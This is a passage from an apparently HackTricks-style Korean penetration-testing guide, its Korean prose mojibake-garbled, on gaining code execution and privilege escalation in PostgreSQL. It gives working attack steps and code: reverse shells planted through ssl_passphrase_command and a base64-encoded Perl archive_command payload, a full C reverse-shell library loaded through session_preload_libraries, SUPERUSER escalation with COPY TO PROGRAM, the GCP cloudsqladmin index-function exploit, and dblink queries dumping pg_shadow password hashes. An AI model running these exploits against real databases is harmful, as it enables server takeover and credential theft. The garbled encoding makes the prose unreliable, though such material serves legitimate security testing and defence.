[rce-with-postgresql-languages.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md)
{% endcontent-ref %}

### PostgreSQL í™•ì¥ ê¸°ëŠ¥ì„ ì‚¬ìš©í•œ RCE

ì´ì „ ê²Œì‹œë¬¼ì—ì„œ **ì´ì§„ íŒŒì¼ ì—…ë¡œë“œí•˜ëŠ” ë°©ë²•**ì„ ë°°ì› ë‹¤ë©´ **PostgreSQL í™•ì¥ ê¸°ëŠ¥ì„ ì—…ë¡œë“œí•˜ê³  ë¡œë“œí•˜ì—¬ RCEë¥¼ íšë“**í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md)
{% endcontent-ref %}

### PostgreSQL êµ¬ì„± íŒŒì¼ RCE

{% hint style="info" %}
ë‹¤ìŒ RCE ë²¡í„°ëŠ” ì œí•œëœ SQLi ì»¨í…ìŠ¤íŠ¸ì—ì„œ íŠ¹íˆ ìœ ìš©í•©ë‹ˆë‹¤. ëª¨ë“  ë‹¨ê³„ë¥¼ ì¤‘ì²©ëœ SELECT ë¬¸ì„ í†µí•´ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

PostgreSQLì˜ **êµ¬ì„± íŒŒì¼**ì€ **ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì‹¤í–‰í•˜ëŠ” postgres ì‚¬ìš©ì**ì— ì˜í•´ **ì“°ê¸° ê°€ëŠ¥**í•˜ë¯€ë¡œ **ìŠˆí¼ ì‚¬ìš©ìë¡œì„œ** íŒŒì¼ ì‹œìŠ¤í…œì— íŒŒì¼ì„ ì“¸ ìˆ˜ ìˆìœ¼ë©° ë”°ë¼ì„œ **ì´ íŒŒì¼ì„ ë®ì–´ì“¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

![](<../.gitbook/assets/image (303).png>)

#### **ssl\_passphrase\_command**ë¥¼ ì‚¬ìš©í•œ RCE

ì´ ê¸°ë²•ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤](https://pulsesecurity.co.nz/articles/postgres-sqli).

êµ¬ì„± íŒŒì¼ì—ëŠ” RCEë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆëŠ” ëª‡ ê°€ì§€ í¥ë¯¸ë¡œìš´ ì†ì„±ì´ ìˆìŠµë‹ˆë‹¤:

* `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` ë°ì´í„°ë² ì´ìŠ¤ì˜ ê°œì¸ í‚¤ ê²½ë¡œ
* `ssl_passphrase_command = ''` ê°œì¸ íŒŒì¼ì´ ì•”í˜¸ë¡œ ë³´í˜¸(ì•”í˜¸í™”)ë˜ì–´ ìˆëŠ” ê²½ìš° PostgreSQLì€ **ì´ ì†ì„±ì— ì§€ì •ëœ ëª…ë ¹ì„ ì‹¤í–‰**í•©ë‹ˆë‹¤.
* `ssl_passphrase_command_supports_reload = off` ì´ ì†ì„±ì´ **on**ì´ë©´ í‚¤ê°€ ì•”í˜¸ë¡œ ë³´í˜¸ë˜ì–´ ìˆì„ ë•Œ **pg_reload_conf()**ê°€ ì‹¤í–‰ë  ë•Œ **ëª…ë ¹ì´ ì‹¤í–‰**ë©ë‹ˆë‹¤.

ë”°ë¼ì„œ ê³µê²©ìëŠ” ë‹¤ìŒì„ ìˆ˜í–‰í•´ì•¼ í•©ë‹ˆë‹¤:

1. ì„œë²„ì—ì„œ **ê°œì¸ í‚¤ ë¤í”„**
2. ë‹¤ìš´ë¡œë“œëœ ê°œì¸ í‚¤ë¥¼ **ì•”í˜¸í™”**:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **ë®ì–´ì“°ê¸°**
4. í˜„ì¬ PostgreSQL **êµ¬ì„± ë¤í”„**
5. ì–¸ê¸‰ëœ ì†ì„± êµ¬ì„±ìœ¼ë¡œ **êµ¬ì„± ë®ì–´ì“°ê¸°**:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()` ì‹¤í–‰

ì´ë¥¼ í…ŒìŠ¤íŠ¸í•˜ëŠ” ë™ì•ˆ ì´ê²ƒì€ **ê°œì¸ í‚¤ íŒŒì¼ì´ ê¶Œí•œ 640**ì„ ê°€ì§€ê³  ìˆê³ , **rootê°€ ì†Œìœ **í•˜ê³  ìˆìœ¼ë©° **ssl-cert ë˜ëŠ” postgres ê·¸ë£¹** (ë”°ë¼ì„œ postgres ì‚¬ìš©ìê°€ ì½ì„ ìˆ˜ ìˆìŒ)ì— ì†í•´ ìˆìœ¼ë©° _/var/lib/postgresql/12/main_ì— ìœ„ì¹˜í•´ ìˆì–´ì•¼ë§Œ ì‘ë™í•œë‹¤ëŠ” ê²ƒì„ ì•Œì•˜ìŠµë‹ˆë‹¤.

#### **archive\_command**ë¥¼ ì‚¬ìš©í•œ RCE

**WALì— ëŒ€í•œ ì´ êµ¬ì„± ë° ì •ë³´ì— ëŒ€í•œ ìì„¸í•œ ë‚´ìš©ì€ ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

êµ¬ì„± íŒŒì¼ì˜ ë˜ ë‹¤ë¥¸ ê³µê²© ê°€ëŠ¥í•œ ì†ì„±ì€ `archive_command`ì…ë‹ˆë‹¤.

ì´ ì‘ì—…ì„ ìˆ˜í–‰í•˜ë ¤ë©´ `archive_mode` ì„¤ì •ì´ `'on'` ë˜ëŠ” `'always'` ì—¬ì•¼ í•©ë‹ˆë‹¤. ê·¸ë ‡ë‹¤ë©´ `archive_command`ì—ì„œ ëª…ë ¹ì„ ë®ì–´ì“°ê³  WAL(write-ahead logging) ì‘ì—…ì„ í†µí•´ ì‹¤í–‰í•˜ë„ë¡ ê°•ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì¼ë°˜ì ì¸ ë‹¨ê³„ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. ì•„ì¹´ì´ë¸Œ ëª¨ë“œê°€ í™œì„±í™”ë˜ì–´ ìˆëŠ”ì§€ í™•ì¸: `SELECT current_setting('archive_mode')`
2. í˜ì´ë¡œë“œë¡œ `archive_command` ë®ì–´ì“°ê¸°. ì˜ˆë¥¼ ë“¤ì–´, ì—­ì‰˜: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. êµ¬ì„± ë‹¤ì‹œë¡œë“œ: `SELECT pg_reload_conf()`
4. WAL ì‘ì—…ì„ ì‹¤í–‰í•˜ë„ë¡ ê°•ì œí•˜ë©´ ì•„ì¹´ì´ë¸Œ ëª…ë ¹ì´ í˜¸ì¶œë©ë‹ˆë‹¤: `SELECT pg_switch_wal()` ë˜ëŠ” ì¼ë¶€ Postgres ë²„ì „ì˜ ê²½ìš° `SELECT pg_switch_xlog()`

#### **preload ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•œ RCE**

ì´ ê¸°ë²•ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤](https://adeadfed.com/posts/postgresql-select-only-rce/).

ì´ ê³µê²© ë²¡í„°ëŠ” ë‹¤ìŒ êµ¬ì„± ë³€ìˆ˜ë¥¼ í™œìš©í•©ë‹ˆë‹¤:

* `session_preload_libraries` -- PostgreSQL ì„œë²„ê°€ í´ë¼ì´ì–¸íŠ¸ ì—°ê²° ì‹œì— ë¡œë“œí•  ë¼ì´ë¸ŒëŸ¬ë¦¬
* `dynamic_library_path` -- PostgreSQL ì„œë²„ê°€ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ê²€ìƒ‰í•  ë””ë ‰í† ë¦¬ ëª©ë¡

ìš°ë¦¬ëŠ” `dynamic_library_path` ê°’ì„ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ì‹¤í–‰í•˜ëŠ” `postgres` ì‚¬ìš©ìê°€ ì“¸ ìˆ˜ ìˆëŠ” ë””ë ‰í† ë¦¬, ì˜ˆë¥¼ ë“¤ì–´ `/tmp/` ë””ë ‰í† ë¦¬ë¡œ ì„¤ì •í•˜ê³  ì•…ì˜ì ì¸ `.so` ê°ì²´ë¥¼ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ PostgreSQL ì„œë²„ê°€ ìƒˆë¡œ ì—…ë¡œë“œí•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¡œë“œí•˜ë„ë¡ `session_preload_libraries` ë³€ìˆ˜ì— í¬í•¨ì‹œí‚¬ ê²ƒì…ë‹ˆë‹¤.

ê³µê²© ë‹¨ê³„ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

1. ì›ë³¸ `postgresql.conf` ë‹¤ìš´ë¡œë“œ
2. `dynamic_library_path` ê°’ì— `/tmp/` ë””ë ‰í† ë¦¬ë¥¼ í¬í•¨, ì˜ˆ: `dynamic_library_path = '/tmp:$libdir'`
3. `session_preload_libraries` ê°’ì— ì•…ì˜ì ì¸ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì´ë¦„ì„ í¬í•¨, ì˜ˆ: `session_preload_libraries = 'payload.so'`
4. `SELECT version()` ì¿¼ë¦¬ë¥¼ í†µí•´ ì£¼ìš” PostgreSQL ë²„ì „ í™•ì¸
5. ì˜¬ë°”ë¥¸ PostgreSQL ê°œë°œ íŒ¨í‚¤ì§€ë¡œ ì•…ì˜ì ì¸ ë¼ì´ë¸ŒëŸ¬ë¦¬ ì½”ë“œë¥¼ ì»´íŒŒì¼í•©ë‹ˆë‹¤. ìƒ˜í”Œ ì½”ë“œ:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

ì½”ë“œ ì»´íŒŒì¼:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```
6. ë‹¨ê³„ 2-3ì—ì„œ ìƒì„±ëœ ì•…ì˜ì ì¸ `postgresql.conf`ë¥¼ ì—…ë¡œë“œí•˜ê³  ì›ë³¸ íŒŒì¼ì„ ë®ì–´ì”ë‹ˆë‹¤.
7. ë‹¨ê³„ 5ì—ì„œ ìƒì„±ëœ `payload.so`ë¥¼ `/tmp` ë””ë ‰í† ë¦¬ì— ì—…ë¡œë“œí•©ë‹ˆë‹¤.
8. ì„œë²„ êµ¬ì„±ì„ ë‹¤ì‹œë¡œë“œí•˜ë ¤ë©´ ì„œë²„ë¥¼ ë‹¤ì‹œ ì‹œì‘í•˜ê±°ë‚˜ `SELECT pg_reload_conf()` ì¿¼ë¦¬ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤.
9. ë‹¤ìŒ DB ì—°ê²° ì‹œ ì—­ì‰˜ ì—°ê²°ì„ ë°›ê²Œ ë©ë‹ˆë‹¤.
## **Postgres ê¶Œí•œ ìƒìŠ¹**

### CREATEROLE ê¶Œí•œ ìƒìŠ¹

#### **ë¶€ì—¬**

[**ë¬¸ì„œ**](https://www.postgresql.org/docs/13/sql-grant.html)ì— ë”°ë¥´ë©´: _**`CREATEROLE`** ê¶Œí•œì„ ê°€ì§„ ì—­í• ì€ **ìŠˆí¼ìœ ì €ê°€ ì•„ë‹Œ** **ì–´ë–¤ ì—­í• ì— ëŒ€í•œ ë©¤ë²„ì‹­ì„ ë¶€ì—¬í•˜ê±°ë‚˜ ì·¨ì†Œ**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤._

ë”°ë¼ì„œ, **`CREATEROLE`** ê¶Œí•œì´ ìˆë‹¤ë©´ ìŠˆí¼ìœ ì €ê°€ ì•„ë‹Œ ë‹¤ë¥¸ **ì—­í• **ì— ëŒ€í•œ ì•¡ì„¸ìŠ¤ ê¶Œí•œì„ ë¶€ì—¬í•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ íŒŒì¼ì„ ì½ê³  ì“°ê±°ë‚˜ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### ë¹„ë°€ë²ˆí˜¸ ìˆ˜ì •

ì´ ì—­í• ì„ ê°€ì§„ ì‚¬ìš©ìëŠ” ë‹¤ë¥¸ **ìŠˆí¼ ì‚¬ìš©ìê°€ ì•„ë‹Œ ì‚¬ìš©ì**ì˜ **ë¹„ë°€ë²ˆí˜¸ë¥¼ ë³€ê²½**í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### SUPERUSERë¡œ ê¶Œí•œ ìƒìŠ¹

**ë¡œì»¬ ì‚¬ìš©ìê°€ ì•”í˜¸ë¥¼ ì œê³µí•˜ì§€ ì•Šê³  PostgreSQLì— ë¡œê·¸ì¸í•  ìˆ˜ ìˆëŠ” ê²ƒì´ ì¼ë°˜ì **ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  **ê¶Œí•œì„ ìˆ˜ì§‘í•œ í›„ì—ëŠ”** ì´ëŸ¬í•œ ê¶Œí•œì„ ë‚¨ìš©í•˜ì—¬ **`SUPERUSER`** ì—­í• ì„ ë¶€ì—¬í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
ì´ëŠ” ì¼ë°˜ì ìœ¼ë¡œ **`pg_hba.conf`** íŒŒì¼ì˜ ë‹¤ìŒ ë¼ì¸ ë•Œë¬¸ì— ê°€ëŠ¥í•©ë‹ˆë‹¤:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE ê¶Œí•œ ìƒìŠ¹**

[**ì´ writeup**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities)ì—ì„œëŠ” ì‚¬ìš©ìì—ê²Œ ë¶€ì—¬ëœ ALTER TABLE ê¶Œí•œì„ ì•…ìš©í•˜ì—¬ Postgres GCPì—ì„œ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í–ˆë˜ ë°©ë²•ì— ëŒ€í•´ ì„¤ëª…ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

**ë‹¤ë¥¸ ì‚¬ìš©ìë¥¼ í…Œì´ë¸” ì†Œìœ ìë¡œ ë§Œë“¤ë ¤ê³ ** ì‹œë„í•˜ë©´ ì´ë¥¼ ë°©ì§€í•˜ëŠ” **ì˜¤ë¥˜**ê°€ ë°œìƒí•´ì•¼ í•˜ì§€ë§Œ, GCPì—ì„œëŠ” ì´ **ì˜µì…˜ì„ ìŠˆí¼ ì‚¬ìš©ìê°€ ì•„ë‹Œ í¬ìŠ¤íŠ¸ê·¸ë ˆìŠ¤ ì‚¬ìš©ìì—ê²Œ** ë¶€ì—¬í–ˆìŠµë‹ˆë‹¤:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

**INSERT/UPDATE/ANALYZE** ëª…ë ¹ì´ **ì¸ë±ìŠ¤ í•¨ìˆ˜ê°€ ìˆëŠ” í…Œì´ë¸”**ì—ì„œ ì‹¤í–‰ë  ë•Œ, **í•¨ìˆ˜**ê°€ ëª…ë ¹ì˜ ì¼ë¶€ë¡œ **í˜¸ì¶œ**ë˜ë©° **í…Œì´ë¸” ì†Œìœ ìì˜ ê¶Œí•œ**ìœ¼ë¡œ ì‹¤í–‰ë©ë‹ˆë‹¤. í•¨ìˆ˜ê°€ ìˆëŠ” ì¸ë±ìŠ¤ë¥¼ ìƒì„±í•˜ê³  í•´ë‹¹ í…Œì´ë¸”ì— ëŒ€í•œ ì†Œìœ ì ê¶Œí•œì„ **ìŠˆí¼ ì‚¬ìš©ìì—ê²Œ ë¶€ì—¬**í•œ ë‹¤ìŒ, ì•…ì˜ì ì¸ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ í…Œì´ë¸”ì— ëŒ€í•´ ANALYZEë¥¼ ì‹¤í–‰í•˜ë©´ ì†Œìœ ìì˜ ê¶Œí•œì„ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. ìƒˆ í…Œì´ë¸”ì„ ìƒì„±í•©ë‹ˆë‹¤.
2. í…Œì´ë¸”ì— ê´€ë ¨ ì—†ëŠ” ì½˜í…ì¸ ë¥¼ ì‚½ì…í•˜ì—¬ ì¸ë±ìŠ¤ ê¸°ëŠ¥ì— ë°ì´í„°ë¥¼ ì œê³µí•©ë‹ˆë‹¤.
3. ì½”ë“œ ì‹¤í–‰ í˜ì´ë¡œë“œë¥¼ í¬í•¨í•˜ëŠ” ì•…ì˜ì ì¸ ì¸ë±ìŠ¤ í•¨ìˆ˜ë¥¼ ê°œë°œí•˜ì—¬ ë¬´ë‹¨ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.
4. í…Œì´ë¸”ì˜ ì†Œìœ ìë¥¼ "cloudsqladmin"ìœ¼ë¡œ ë³€ê²½í•©ë‹ˆë‹¤. ì´ëŠ” GCPì˜ ìŠˆí¼ìœ ì € ì—­í• ë¡œ, Cloud SQLì´ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ ê´€ë¦¬í•˜ê³  ìœ ì§€í•˜ëŠ” ë° ì „ìš©ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.
5. í…Œì´ë¸”ì— ëŒ€í•´ ANALYZE ì‘ì—…ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ PostgreSQL ì—”ì§„ì„ ê°•ì œë¡œ í…Œì´ë¸” ì†Œìœ ì "cloudsqladmin"ì˜ ì‚¬ìš©ì ì»¨í…ìŠ¤íŠ¸ë¡œ ì „í™˜ì‹œí‚µë‹ˆë‹¤. ê²°ê³¼ì ìœ¼ë¡œ ì•…ì˜ì ì¸ ì¸ë±ìŠ¤ í•¨ìˆ˜ê°€ "cloudsqladmin"ì˜ ê¶Œí•œìœ¼ë¡œ í˜¸ì¶œë˜ì–´ ì´ì „ì— ë¬´ë‹¨ìœ¼ë¡œ ì‹¤í–‰ë˜ì§€ ì•Šì•˜ë˜ ì…¸ ëª…ë ¹ì„ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

PostgreSQLì—ì„œ ì´ íë¦„ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
ê·¸ëŸ¬ë©´ `shell_commands_results` í…Œì´ë¸”ì—ëŠ” ì‹¤í–‰ëœ ì½”ë“œì˜ ì¶œë ¥ì´ í¬í•¨ë©ë‹ˆë‹¤:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### ë¡œì»¬ ë¡œê·¸ì¸

ì¼ë¶€ êµ¬ì„±ì´ ì˜ëª»ëœ postgresql ì¸ìŠ¤í„´ìŠ¤ëŠ” ëª¨ë“  ë¡œì»¬ ì‚¬ìš©ìì˜ ë¡œê·¸ì¸ì„ í—ˆìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **`dblink` í•¨ìˆ˜**ë¥¼ ì‚¬ìš©í•˜ì—¬ 127.0.0.1ì—ì„œ ë¡œì»¬ë¡œ ë¡œê·¸ì¸í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
ì´ì „ ì¿¼ë¦¬ê°€ ì‘ë™í•˜ë ¤ë©´ **`dblink` í•¨ìˆ˜ê°€ ì¡´ì¬í•´ì•¼**í•©ë‹ˆë‹¤. ê·¸ë ‡ì§€ ì•Šì€ ê²½ìš° ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ë§Œë“¤ì–´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

ë§Œì•½ ë” ë§ì€ ê¶Œí•œì„ ê°€ì§„ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ê°€ì§€ê³  ìˆì§€ë§Œ í•´ë‹¹ ì‚¬ìš©ìê°€ ì™¸ë¶€ IPì—ì„œ ë¡œê·¸ì¸í•  ìˆ˜ ì—†ëŠ” ê²½ìš° ë‹¤ìŒ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ í•´ë‹¹ ì‚¬ìš©ìë¡œì¨ ì¿¼ë¦¬ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
ë‹¤ìŒê³¼ ê°™ì´ ì´ í•¨ìˆ˜ê°€ ì¡´ì¬í•˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### ì‚¬ìš©ì ì •ì˜ í•¨ìˆ˜ì™€ SECURITY DEFINER

[**ì´ ë¬¸ì„œ**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql)ì—ì„œ, íœí…ŒìŠ¤í„°ë“¤ì€ IBMì—ì„œ ì œê³µí•˜ëŠ” postgres ì¸ìŠ¤í„´ìŠ¤ ë‚´ì—ì„œ íŠ¹ì • í•¨ìˆ˜ë¥¼ ë°œê²¬í•˜ì—¬ **SECURITY DEFINER í”Œë˜ê·¸ê°€ ì§€ì •ëœ í•¨ìˆ˜**ë¥¼ ì°¾ì•„ ê¶Œí•œ ìƒìŠ¹(privesc)ì— ì„±ê³µí–ˆìŠµë‹ˆë‹¤:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>

[**ë¬¸ì„œì—ì„œ ì„¤ëª…í•œ ê²ƒ**](https://www.postgresql.org/docs/current/sql-createfunction.html)ê³¼ ê°™ì´, **SECURITY DEFINERê°€ ì§€ì •ëœ í•¨ìˆ˜**ëŠ” **í•´ë‹¹ í•¨ìˆ˜ë¥¼ ì†Œìœ í•œ ì‚¬ìš©ìì˜ ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰**ë©ë‹ˆë‹¤. ë”°ë¼ì„œ, í•¨ìˆ˜ê°€ **SQL Injectionì— ì·¨ì•½**í•˜ê±°ë‚˜ **ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ë§¤ê°œë³€ìˆ˜ë¡œ ê¶Œí•œì´ í•„ìš”í•œ ì‘ì—…ì„ ìˆ˜í–‰**í•˜ëŠ” ê²½ìš°, postgres ë‚´ì—ì„œ **ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì „ ì½”ë“œì˜ 4ë²ˆì§¸ ì¤„ì—ì„œ í•¨ìˆ˜ì— **SECURITY DEFINER** í”Œë˜ê·¸ê°€ ì§€ì •ë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
ê·¸ëŸ° ë‹¤ìŒ **ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰**í•˜ì‹­ì‹œì˜¤:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQLì„ ì‚¬ìš©í•œ Burteforce í†µê³¼

**PL/pgSQL**ì€ SQLë³´ë‹¤ ë” ë§ì€ ì ˆì°¨ì  ì œì–´ë¥¼ ì œê³µí•˜ëŠ” **ì™„ì „í•œ ê¸°ëŠ¥ì„ ê°–ì¶˜ í”„ë¡œê·¸ë˜ë° ì–¸ì–´**ì…ë‹ˆë‹¤. ì´ëŠ” **ë£¨í”„** ë° ë‹¤ë¥¸ **ì œì–´ êµ¬ì¡°**ë¥¼ ì‚¬ìš©í•˜ì—¬ í”„ë¡œê·¸ë¨ ë…¼ë¦¬ë¥¼ í–¥ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜í•œ **SQL ë¬¸** ë° **íŠ¸ë¦¬ê±°**ëŠ” **PL/pgSQL ì–¸ì–´**ë¥¼ ì‚¬ìš©í•˜ì—¬ ìƒì„±ëœ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ í†µí•©ì„ í†µí•´ ë°ì´í„°ë² ì´ìŠ¤ í”„ë¡œê·¸ë˜ë° ë° ìë™í™”ì— ëŒ€í•´ ë” í¬ê´„ì ì´ê³  ë‹¤ì–‘í•œ ì ‘ê·¼ ë°©ì‹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
**ì´ ì–¸ì–´ë¥¼ ë‚¨ìš©í•˜ì—¬ PostgreSQLì— ì‚¬ìš©ì ìê²© ì¦ëª…ì„ ë¬´ì°¨ë³„ ëŒ€ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
